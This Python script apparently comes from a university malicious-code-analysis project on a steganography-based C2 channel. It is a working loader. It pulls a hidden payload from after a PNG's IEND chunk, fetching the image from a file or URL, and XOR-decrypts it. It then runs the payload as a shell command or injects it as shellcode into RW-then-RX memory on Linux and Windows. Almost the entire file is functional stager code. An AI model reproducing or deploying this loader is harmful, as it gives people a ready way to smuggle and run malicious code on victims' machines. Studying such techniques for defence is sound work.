#!/usr/bin/env python3
"""
Payload Extractor - EOF Technique (simulates C/C++ loader)

Extracts payloads appended after the PNG IEND chunk.

This simulates what the C/C++ payload-extractor-from-file.cpp does in the
real hide-payload-in-images project.

In a real attack, this extraction and execution would happen in a compiled
C/C++ binary (or via Adaptix C2 beacon) to avoid detection. We use Python
here for demo clarity.

Real-world extraction methods (from the original project):
  1. From disk: read file, seek past original image size, read payload
  2. From .rsrc section: embed image in PE resources, extract via WinAPI
  3. From .rsrc via PEB: manual PE header parsing (no WinAPI calls = stealthier)

CMU Heinz College - 95-759 Malicious Code Analysis
Group Project: Steganography-Based C2 Channel

Usage:
    python payload_extractor.py <image_file_or_url> [--xor-key KEY] [--save FILE]
    python payload_extractor.py --run-shellcode shellcode.bin

Examples:
    python payload_extractor.py images/embedded_eof.png
    python payload_extractor.py images/embedded_eof.png --xor-key 0x4D
    python payload_extractor.py images/embedded_eof.png --xor-key 0x4D --run-shellcode
    python payload_extractor.py --shellcode-file shellcode.bin --bits 32
"""

import argparse
import hashlib
import io
import struct
import subprocess
import sys
import os
import platform
import signal

try:
    import requests
except ImportError:
    requests = None

# For shellcode execution
import ctypes
import ctypes.util
import mmap

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PNG_IEND_MARKER = b'\x00\x00\x00\x00IEND\xaeB`\x82'

# Magic bytes for payload type identification
PAYLOAD_SIGNATURES = {
    b'MZ':          'PE executable (Windows EXE/DLL)',
    b'\x7fELF':    'ELF executable (Linux)',
    b'\xfe\xed\xfa': 'Mach-O executable (macOS)',
    b'\xcf\xfa\xed\xfe': 'Mach-O 64-bit executable (macOS)',
    b'PK':          'ZIP archive / DOCX / JAR',
    b'\x1f\x8b':   'Gzip compressed data',
}

# Linux syscall numbers for x86_64
SYS_MPROTECT = 10

# Memory protection constants
PROT_NONE  = 0x0
PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4

# mmap flags
MAP_SHARED    = 0x01
MAP_PRIVATE   = 0x02
MAP_ANONYMOUS = 0x20

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def xor_decrypt(data: bytes, key: int) -> bytes:
    """XOR decrypt data with a single-byte key (symmetric)."""
    return bytes([b ^ key for b in data])


def find_iend_offset(image_data: bytes) -> int:
    """Find the byte offset where the PNG IEND chunk ends."""
    pos = image_data.find(PNG_IEND_MARKER)
    if pos == -1:
        return -1
    return pos + len(PNG_IEND_MARKER)


def identify_payload_type(payload: bytes) -> str:
    """Identify the payload type based on magic bytes / heuristics."""
    for magic, description in PAYLOAD_SIGNATURES.items():
        if payload[:len(magic)] == magic:
            return description

    # Heuristic: if the payload is mostly non-printable bytes, likely shellcode
    non_printable = sum(1 for b in payload[:256] if b < 0x20 or b > 0x7e)
    ratio = non_printable / min(len(payload), 256)
    if ratio > 0.4:
        return "Raw shellcode / binary blob"

    return "Unknown binary data"


def compute_hashes(data: bytes) -> dict:
    """Compute common hashes for the payload (useful for analysis)."""
    return {
        'MD5':    hashlib.md5(data).hexdigest(),
        'SHA1':   hashlib.sha1(data).hexdigest(),
        'SHA256': hashlib.sha256(data).hexdigest(),
    }


def hex_dump(data: bytes, length: int = 256, cols: int = 16) -> str:
    """
    Produce an xxd-style hex dump with ASCII sidebar.
    Shows up to `length` bytes of data.
    """
    lines = []
    show = data[:length]
    for offset in range(0, len(show), cols):
        chunk = show[offset:offset + cols]
        hex_part   = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 0x20 <= b < 0x7f else '.' for b in chunk)
        lines.append(f"  {offset:08x}  {hex_part:<{cols * 3}}  |{ascii_part}|")
    if len(data) > length:
        lines.append(f"  ... ({len(data) - length} more bytes)")
    return '\n'.join(lines)


def analyze_shellcode(shellcode: bytes) -> dict:
    """
    Perform basic analysis on shellcode to help identify issues.
    """
    analysis = {
        'size': len(shellcode),
        'first_16_bytes': shellcode[:16].hex(),
        'null_bytes': shellcode.count(0x00),
        'null_ratio': shellcode.count(0x00) / len(shellcode) if shellcode else 0,
    }

    # Check for common x86/x64 prologues
    if shellcode[:3] == b'\x55\x89\xe5':       # push ebp; mov ebp, esp
        analysis['arch_hint'] = '32-bit x86 (push ebp; mov ebp, esp)'
    elif shellcode[:4] == b'\x55\x48\x89\xe5': # push rbp; mov rbp, rsp
        analysis['arch_hint'] = '64-bit x64 (push rbp; mov rbp, rsp)'
    elif shellcode[:2] == b'\xeb\xfe':          # jmp $
        analysis['arch_hint'] = 'Infinite loop (test shellcode)'
    elif shellcode[0:1] == b'\xcc':             # int3
        analysis['arch_hint'] = 'Contains breakpoint (int3) - debug shellcode'
    else:
        analysis['arch_hint'] = 'Unknown architecture'

    # Check for common shellcode patterns
    patterns = {
        'syscall':   b'\x0f\x05',
        'int 0x80':  b'\xcd\x80',
        'sysenter':  b'\x0f\x34',
        'call rax':  b'\xff\xd0',
    }
    analysis['patterns_found'] = []
    for name, pattern in patterns.items():
        if pattern in shellcode:
            analysis['patterns_found'].append(name)

    return analysis


# ---------------------------------------------------------------------------
# Shellcode Execution
# ---------------------------------------------------------------------------

def execute_shellcode(shellcode: bytes, bits: int = 64) -> None:
    """
    Execute raw shellcode in memory.

    This uses a W^X bypass technique:
    1. Allocate memory as RW (read-write)
    2. Copy shellcode
    3. Change permissions to RX (read-execute) using mprotect

    Args:
        shellcode: Raw shellcode bytes
        bits:      32 or 64 - specifies the architecture to run as

    WARNING: This executes arbitrary code - use only in isolated VMs!
    """
    size = len(shellcode)

    print()
    print("=" * 60)
    print("  SHELLCODE EXECUTION")
    print("=" * 60)
    print(f"[*] Shellcode size: {size} bytes")
    print(f"[*] Platform: {platform.system()} {platform.machine()}")
    print(f"[*] Execution mode: {bits}-bit")

    if size == 0:
        print("[-] ERROR: Shellcode is empty!")
        return

    # Analyse shellcode first
    print()
    print("[*] Shellcode Analysis:")
    analysis = analyze_shellcode(shellcode)
    print(f"    - Architecture hint: {analysis['arch_hint']}")
    print(f"    - Null bytes: {analysis['null_bytes']} ({analysis['null_ratio']:.1%})")
    print(f"    - First 16 bytes: {analysis['first_16_bytes']}")
    if analysis['patterns_found']:
        print(f"    - Patterns found: {', '.join(analysis['patterns_found'])}")

    # Check for architecture mismatch warning
    if '32-bit' in analysis['arch_hint'] and bits == 64:
        print()
        print("[!] WARNING: Shellcode appears to be 32-bit but running in 64-bit mode!")
        print("[!] This will likely crash. Use --bits 32 flag.")
    elif '64-bit' in analysis['arch_hint'] and bits == 32:
        print()
        print("[!] WARNING: Shellcode appears to be 64-bit but running in 32-bit mode!")
        print("[!] This will likely crash. Remove --bits 32 flag.")

    # Align size to page boundary for mmap
    # Get page size cross-platform
    if platform.system() == "Windows":
        try:
            kernel32 = ctypes.windll.kernel32

            class SYSTEM_INFO(ctypes.Structure):
                _fields_ = [
                    ("wProcessorArchitecture", ctypes.c_uint16),
                    ("wReserved", ctypes.c_uint16),
                    ("dwPageSize", ctypes.c_uint32),
                    ("lpMinimumApplicationAddress", ctypes.c_void_p),
                    ("lpMaximumApplicationAddress", ctypes.c_void_p),
                    ("dwActiveProcessorMask", ctypes.c_size_t),
                    ("dwNumberOfProcessors", ctypes.c_uint32),
                    ("dwProcessorType", ctypes.c_uint32),
                    ("dwAllocationGranularity", ctypes.c_uint32),
                    ("wProcessorLevel", ctypes.c_uint16),
                    ("wProcessorRevision", ctypes.c_uint16),
                ]

            sysinfo = SYSTEM_INFO()
            kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
            page_size = sysinfo.dwPageSize
        except Exception:
            page_size = 4096
    else:
        # Unix/Linux: use sysconf
        try:
            page_size = os.sysconf('SC_PAGESIZE')
        except (AttributeError, ValueError):
            page_size = 4096  # Fallback

    aligned_size = (size + page_size - 1) & ~(page_size - 1)

    print()
    print(f"[*] Page size: {page_size} bytes")
    print(f"[*] Allocating {aligned_size} bytes of memory...")

    system = platform.system()

    try:
        if system == "Linux":
            execute_shellcode_linux(shellcode, aligned_size, bits)
        elif system == "Windows":
            execute_shellcode_windows(shellcode, aligned_size, bits)
        else:
            print(f"[-] Unsupported platform: {system}")
            return
    except PermissionError as e:
        print(f"[-] Permission denied: {e}")
        print("[*] Try: sudo setenforce 0  (temporarily disable SELinux)")
    except OSError as e:
        print(f"[-] Memory operation failed: {e}")
        import traceback
        traceback.print_exc()
    except Exception as e:
        print(f"[-] Execution failed: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()

    print("=" * 60)


def execute_shellcode_linux(shellcode: bytes, aligned_size: int, bits: int = 64) -> None:
    """
    Execute shellcode on Linux using W^X bypass technique.

    Technique:
    1. mmap with PROT_READ | PROT_WRITE (RW)
    2. Copy shellcode to memory
    3. mprotect to PROT_READ | PROT_EXEC (RX)
    4. Execute
    """
    libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

    # Step 1: Allocate RW memory (NOT executable yet)
    print("[*] Step 1: Allocating RW memory (bypassing W^X)...")

    # mmap(addr, length, prot, flags, fd, offset)
    mmap_func = libc.mmap
    mmap_func.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
                          ctypes.c_int, ctypes.c_int, ctypes.c_long]
    mmap_func.restype = ctypes.c_void_p

    mem_addr = mmap_func(
        None,                              # let kernel choose address
        aligned_size,
        PROT_READ | PROT_WRITE,            # RW only - NOT executable
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,                                # no file descriptor
        0                                  # offset
    )

    # Check for mmap failure (returns -1 or MAP_FAILED which is usually -1 cast to pointer)
    if mem_addr == ctypes.c_void_p(-1).value or mem_addr == 0 or mem_addr > 0x7fffffffffff:
        errno = ctypes.get_errno()
        print(f"[-] mmap failed with errno: {errno}")
        print(f"[-] Error: {os.strerror(errno)}")
        return

    print(f"[+] Memory allocated at: 0x{mem_addr:016x}")
    print(f"[+] Initial permissions: RW (read-write)")

    # Step 2: Copy shellcode to memory
    print("[*] Step 2: Copying shellcode to memory...")

    # Create a buffer to write to the allocated memory
    buf = (ctypes.c_char * len(shellcode)).from_address(mem_addr)
    ctypes.memmove(mem_addr, shellcode, len(shellcode))
    print(f"[+] Copied {len(shellcode)} bytes")

    # Verify copy
    verification = bytes(buf)
    if verification == shellcode:
        print("[+] Shellcode verified in memory")
    else:
        print("[-] WARNING: Shellcode verification mismatch!")
        return

    # Step 3: Change permissions to RX (executable, NOT writable)
    print("[*] Step 3: Changing permissions to RX (read-execute)...")

    # mprotect(addr, len, prot)
    mprotect_func = libc.mprotect
    mprotect_func.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
    mprotect_func.restype = ctypes.c_int

    result = mprotect_func(mem_addr, aligned_size, PROT_READ | PROT_EXEC)
    if result != 0:
        errno = ctypes.get_errno()
        print(f"[-] mprotect failed with errno: {errno}")
        print(f"[-] Error: {os.strerror(errno)}")
        # Try to clean up
        libc.munmap(mem_addr, aligned_size)
        return

    print(f"[+] Permissions changed to: RX (read-execute)")
    print(f"[+] W^X bypass successful!")
    print()

    # Step 4: Create function pointer and execute
    print("[*] Step 4: Executing shellcode...")
    print("-" * 60)
    print("[*] (If nothing happens, shellcode may be waiting for input)")
    print("[*] (Press Ctrl+C to interrupt if needed)")
    print()

    try:
        if bits == 32:
            shellcode_func = ctypes.CFUNCTYPE(ctypes.c_uint32)(mem_addr)
        else:
            shellcode_func = ctypes.CFUNCTYPE(ctypes.c_uint64)(mem_addr)

        result = shellcode_func()
        print()
        print("-" * 60)
        if bits == 64:
            print(f"[+] Shellcode returned: 0x{result:016x}")
        else:
            print(f"[+] Shellcode returned: 0x{result:08x}")
    except KeyboardInterrupt:
        print()
        print("[!] Interrupted by user")
    except OSError as e:
        print()
        print("-" * 60)
        print(f"[-] Shellcode crashed!")
        print(f"[-] Error: {e}")
        if "access violation" in str(e).lower() or "segmentation fault" in str(e).lower():
            print()
            print("[*] DIAGNOSIS: The shellcode accessed invalid memory.")
            print("[*] Possible causes:")
            print("     1. 32-bit shellcode running in 64-bit mode (try --bits 32)")
            print("     2. Shellcode has hardcoded addresses")
            print("     3. Shellcode expects certain registers to be set up")
            print("     4. Shellcode is corrupted or incomplete")
            print()
            print("[*] Try analyzing with:")
            print(f"     objdump -D -b binary -m i386 shellcode.bin")
            print(f"     ndisasm -b 32 shellcode.bin")
    finally:
        # Clean up
        print()
        print("[*] Cleaning up memory...")
        libc.munmap(mem_addr, aligned_size)


def execute_shellcode_windows(shellcode: bytes, aligned_size: int, bits: int = 64) -> None:
    """
    Execute shellcode on Windows using VirtualAlloc.

    Fix: VirtualAlloc returns a 64-bit pointer on 64-bit Windows. Without
    explicitly setting restype to c_void_p, ctypes truncates the return
    value to a 32-bit c_int, which then gets sign-extended to an invalid
    address (e.g. 0xFFFFFFFF84150000), causing an access violation on
    the subsequent memmove.
    """
    kernel32 = ctypes.windll.kernel32

    # VirtualAlloc parameters
    MEM_COMMIT  = 0x1000
    MEM_RESERVE = 0x2000
    MEM_RELEASE = 0x8000
    PAGE_READWRITE         = 0x04
    PAGE_EXECUTE_READ      = 0x20
    PAGE_EXECUTE_READWRITE = 0x40

    # ------------------------------------------------------------------
    # CRITICAL FIX: Set proper 64-bit argument / return types so ctypes
    # does not truncate the returned pointer to 32 bits.
    # ------------------------------------------------------------------
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p,   # lpAddress
        ctypes.c_size_t,   # dwSize
        ctypes.c_uint32,   # flAllocationType
        ctypes.c_uint32,   # flProtect
    ]
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    kernel32.VirtualProtect.argtypes = [
        ctypes.c_void_p,                   # lpAddress
        ctypes.c_size_t,                   # dwSize
        ctypes.c_uint32,                   # flNewProtect
        ctypes.POINTER(ctypes.c_uint32),   # lpflOldProtect
    ]
    kernel32.VirtualProtect.restype = ctypes.c_bool

    kernel32.VirtualFree.argtypes = [
        ctypes.c_void_p,   # lpAddress
        ctypes.c_size_t,   # dwSize
        ctypes.c_uint32,   # dwFreeType
    ]
    kernel32.VirtualFree.restype = ctypes.c_bool

    # ------------------------------------------------------------------
    # Step 1: Allocate RW memory (not yet executable — W^X friendly)
    # ------------------------------------------------------------------
    print("[*] Step 1: Allocating RW memory...")

    mem_addr = kernel32.VirtualAlloc(
        None,
        aligned_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )

    if not mem_addr:
        error = ctypes.get_last_error()
        print(f"[-] VirtualAlloc failed with error: {error}")
        return

    print(f"[+] Memory allocated at: 0x{mem_addr:016x}")
    print(f"[+] Initial permissions: RW (read-write)")

    # ------------------------------------------------------------------
    # Step 2: Copy shellcode to allocated memory
    # ------------------------------------------------------------------
    print("[*] Step 2: Copying shellcode to memory...")
    ctypes.memmove(mem_addr, shellcode, len(shellcode))
    print(f"[+] Copied {len(shellcode)} bytes")

    # Verify copy
    buf = (ctypes.c_char * len(shellcode)).from_address(mem_addr)
    if bytes(buf) == shellcode:
        print("[+] Shellcode verified in memory")
    else:
        print("[-] WARNING: Shellcode verification mismatch!")
        kernel32.VirtualFree(mem_addr, 0, MEM_RELEASE)
        return

    # ------------------------------------------------------------------
    # Step 3: Change permissions to RX (W^X bypass)
    # ------------------------------------------------------------------
    print("[*] Step 3: Changing permissions to RX (read-execute)...")

    old_protect = ctypes.c_uint32(0)
    success = kernel32.VirtualProtect(
        mem_addr,
        aligned_size,
        PAGE_EXECUTE_READ,
        ctypes.byref(old_protect)
    )
    if not success:
        error = ctypes.get_last_error()
        print(f"[-] VirtualProtect failed with error: {error}")
        kernel32.VirtualFree(mem_addr, 0, MEM_RELEASE)
        return

    print(f"[+] Permissions changed to: RX (read-execute)")
    print(f"[+] W^X bypass successful!")
    print()

    # ------------------------------------------------------------------
    # Step 4: Create function pointer and execute
    # ------------------------------------------------------------------
    print("[*] Step 4: Executing shellcode...")
    print("-" * 60)
    print("[*] (If nothing happens, shellcode may be waiting for input)")
    print("[*] (Press Ctrl+C to interrupt if needed)")
    print()

    try:
        if bits == 32:
            shellcode_func = ctypes.CFUNCTYPE(ctypes.c_uint32)(mem_addr)
        else:
            shellcode_func = ctypes.CFUNCTYPE(ctypes.c_uint64)(mem_addr)

        result = shellcode_func()
        print()
        print("-" * 60)
        if bits == 64:
            print(f"[+] Shellcode returned: 0x{result:016x}")
        else:
            print(f"[+] Shellcode returned: 0x{result:08x}")
    except KeyboardInterrupt:
        print()
        print("[!] Interrupted by user")
    except OSError as e:
        print()
        print("-" * 60)
        print(f"[-] Shellcode crashed!")
        print(f"[-] Error: {e}")
        if "access violation" in str(e).lower() or "segmentation fault" in str(e).lower():
            print()
            print("[*] DIAGNOSIS: The shellcode accessed invalid memory.")
            print("[*] Possible causes:")
            print("     1. 32-bit shellcode running in 64-bit mode (try --bits 32)")
            print("     2. Shellcode has hardcoded addresses")
            print("     3. Shellcode expects certain registers to be set up")
            print("     4. Shellcode is corrupted or incomplete")
            print()
            print("[*] Try analyzing with:")
            print("     dumpbin /disasm shellcode.bin")
            print("     ndisasm -b 64 shellcode.bin")
    finally:
        # Clean up
        print()
        print("[*] Cleaning up memory...")
        kernel32.VirtualFree(mem_addr, 0, MEM_RELEASE)


def execute_shellcode_from_file(filepath: str, xor_key: int = None, bits: int = 64) -> None:
    """
    Load shellcode from a .bin file and execute it.
    """
    print(f"[*] Loading shellcode from: {filepath}")

    try:
        with open(filepath, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"[-] ERROR: File not found: {filepath}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] ERROR reading file: {e}")
        sys.exit(1)

    # Decrypt if XOR key provided
    if xor_key is not None:
        print(f"[*] XOR decrypting with key: 0x{xor_key:02X}")
        shellcode = xor_decrypt(shellcode, xor_key)

    print(f"[+] Loaded {len(shellcode)} bytes")

    # Show hex dump
    print()
    print("[+] Shellcode hex dump:")
    print(hex_dump(shellcode, length=128))

    # Show hashes
    hashes = compute_hashes(shellcode)
    print()
    print("[+] Shellcode hashes:")
    for algo, digest in hashes.items():
        print(f"  {algo:6s}: {digest}")

    # Execute
    execute_shellcode(shellcode, bits=bits)


# ---------------------------------------------------------------------------
# Extraction
# ---------------------------------------------------------------------------

def extract_payload(image_data: bytes, xor_key: int = None) -> bytes:
    """Extract the hidden payload from after the IEND chunk."""

    total_size = len(image_data)

    # Verify PNG signature
    if image_data[:8] != b'\x89PNG\r\n\x1a\n':
        print("[-] ERROR: Not a valid PNG file.")
        sys.exit(1)

    # Find IEND
    iend_offset = find_iend_offset(image_data)
    if iend_offset == -1:
        print("[-] ERROR: Could not find PNG IEND chunk.")
        sys.exit(1)

    print(f"[*] PNG IEND chunk ends at byte: {iend_offset}")
    print(f"[*] Total file size: {total_size:,} bytes")

    # Check for appended data
    appended_size = total_size - iend_offset
    if appended_size <= 0:
        print("[-] No data found after IEND chunk.")
        print("[-] This image does not contain an EOF-appended payload.")
        sys.exit(1)

    print(f"[*] Data after IEND: {appended_size:,} bytes")

    # Read the 4-byte little-endian size header
    if appended_size < 4:
        print("[-] ERROR: Appended data too small to contain size header.")
        sys.exit(1)

    payload_size = struct.unpack('<I', image_data[iend_offset:iend_offset + 4])[0]
    available = appended_size - 4

    print(f"[*] Payload size (from header): {payload_size:,} bytes")
    print(f"[*] Available data after header: {available:,} bytes")

    if payload_size > available:
        print(f"[-] ERROR: Header claims {payload_size} bytes but only {available} available.")
        sys.exit(1)

    # Extract
    print("[*] Extracting payload bytes...")
    payload_bytes = image_data[iend_offset + 4: iend_offset + 4 + payload_size]

    # XOR decrypt if key provided
    if xor_key is not None:
        print(f"[*] XOR decrypting with key: 0x{xor_key:02X}")
        payload_bytes = xor_decrypt(payload_bytes, xor_key)

    return payload_bytes


# ---------------------------------------------------------------------------
# Loaders
# ---------------------------------------------------------------------------

def load_from_url(url: str) -> bytes:
    """Download image data from a URL."""
    if requests is None:
        print("[-] ERROR: 'requests' library not installed (pip install requests)")
        sys.exit(1)

    print(f"[*] Fetching image from {url} ...")
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print(f"[-] ERROR: Could not connect to {url}")
        sys.exit(1)
    except requests.exceptions.HTTPError as e:
        print(f"[-] ERROR: HTTP error: {e}")
        sys.exit(1)

    print(f"[*] Downloaded: {len(response.content):,} bytes")
    return response.content


def load_from_file(path: str) -> bytes:
    """Read image data from a local file."""
    print(f"[*] Loading image from file: {path}")
    try:
        with open(path, 'rb') as f:
            return f.read()
    except FileNotFoundError:
        print(f"[-] ERROR: File not found: {path}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Payload Extractor - Extract hidden payloads from after PNG IEND chunk",
        epilog="Example: python payload_extractor.py images/embedded_eof.png --xor-key 0x4D"
    )
    parser.add_argument("source", nargs='?', default=None,
                        help="URL or local file path of the embedded PNG image")
    parser.add_argument("--xor-key", "-x", type=lambda x: int(x, 0), default=None,
                        help="XOR key used during embedding (0-255)")
    parser.add_argument("--execute", "-e", action="store_true",
                        help="Execute extracted payload as a shell command (text payloads only)")
    parser.add_argument("--run-shellcode", "-r", action="store_true",
                        help="Execute extracted binary payload as shellcode (DANGEROUS!)")
    parser.add_argument("--shellcode-file", "-S", type=str, default=None,
                        help="Load and execute shellcode from a .bin file directly")
    parser.add_argument("--bits", "-b", type=int, choices=[32, 64], default=64,
                        help="Run shellcode in 32-bit or 64-bit mode (default: 64)")
    parser.add_argument("--save", "-s", type=str, default=None,
                        help="Save extracted payload to a file (auto-saves binary payloads)")
    parser.add_argument("--dump-bytes", "-d", type=int, default=256,
                        help="Number of bytes to show in hex dump (default: 256)")
    args = parser.parse_args()

    # Direct shellcode execution mode
    if args.shellcode_file:
        execute_shellcode_from_file(args.shellcode_file, args.xor_key, args.bits)
        return

    # Require source for other operations
    if args.source is None:
        parser.print_help()
        print("\n[-] ERROR: Source file/URL required unless using --shellcode-file")
        sys.exit(1)

    print("=" * 60)
    print("  PAYLOAD EXTRACTOR - EOF Append Technique")
    print("  (Simulating C/C++ loader from hide-payload-in-images)")
    print("=" * 60)
    print()

    # ------------------------------------------------------------------
    # 1. Load image data
    # ------------------------------------------------------------------
    if args.source.startswith("http://") or args.source.startswith("https://"):
        image_data = load_from_url(args.source)
    else:
        image_data = load_from_file(args.source)

    # ------------------------------------------------------------------
    # 2. Extract payload
    # ------------------------------------------------------------------
    payload_bytes = extract_payload(image_data, args.xor_key)

    # ------------------------------------------------------------------
    # 3. Classify payload
    # ------------------------------------------------------------------
    print()

    try:
        text = payload_bytes.decode('utf-8')
        is_text = all(c.isprintable() or c in '\n\r\t' for c in text)
    except UnicodeDecodeError:
        text = None
        is_text = False

    if is_text and text:
        payload_type = "Text command / script"
        print(f"[+] Payload type: {payload_type}")
        print(f"[+] Payload (text): {text}")
    else:
        payload_type = identify_payload_type(payload_bytes)
        print(f"[+] Payload type: {payload_type}")
        print(f"[+] Payload size: {len(payload_bytes):,} bytes")
        print()
        print("[+] Hex dump:")
        print(hex_dump(payload_bytes, length=args.dump_bytes))

    # ------------------------------------------------------------------
    # 4. Hashes (always useful for analysis / reporting)
    # ------------------------------------------------------------------
    hashes = compute_hashes(payload_bytes)
    print()
    print("[+] Payload hashes:")
    for algo, digest in hashes.items():
        print(f"  {algo:6s}: {digest}")

    # ------------------------------------------------------------------
    # 5. Save payload
    # ------------------------------------------------------------------
    save_path = args.save

    # Auto-save binary payloads if no explicit path given
    if save_path is None and not is_text:
        save_path = "shellcode.bin"
        print()
        print(f"[*] Binary payload detected — auto-saving to: {save_path}")

    if save_path:
        with open(save_path, 'wb') as f:
            f.write(payload_bytes)
        print(f"[+] Payload saved to: {save_path}")

    # ------------------------------------------------------------------
    # 6. Execute (text payloads) or Run Shellcode (binary payloads)
    # ------------------------------------------------------------------
    if args.execute:
        if is_text and text:
            print()
            print(f"[*] Executing command: {text}")
            print("[+] Command output:")
            print("-" * 60)
            try:
                result = subprocess.run(
                    text, shell=True,
                    capture_output=True, text=True,
                    timeout=30
                )
                if result.stdout:
                    print(result.stdout)
                if result.stderr:
                    print("[stderr]:", result.stderr)
            except subprocess.TimeoutExpired:
                print("[-] Command timed out.")
            print("-" * 60)
        else:
            print()
            print("[*] Payload is binary shellcode — cannot execute as text.")
            print("[*] Use --run-shellcode to execute binary payloads, or analyze with:")
            print("     - objdump -D -b binary -m i386:x86-64 shellcode.bin")
            print("     - ndisasm -b 64 shellcode.bin")

    if args.run_shellcode:
        if is_text:
            print()
            print("[-] --run-shellcode is for binary payloads only.")
            print("[-] Text payloads should use --execute instead.")
        else:
            # Execute the extracted shellcode
            execute_shellcode(payload_bytes, bits=args.bits)

    # ------------------------------------------------------------------
    # Done
    # ------------------------------------------------------------------
    print()
    print("=" * 60)
    print("[+] Extraction complete.")
    print("=" * 60)


if __name__ == "__main__":
    main()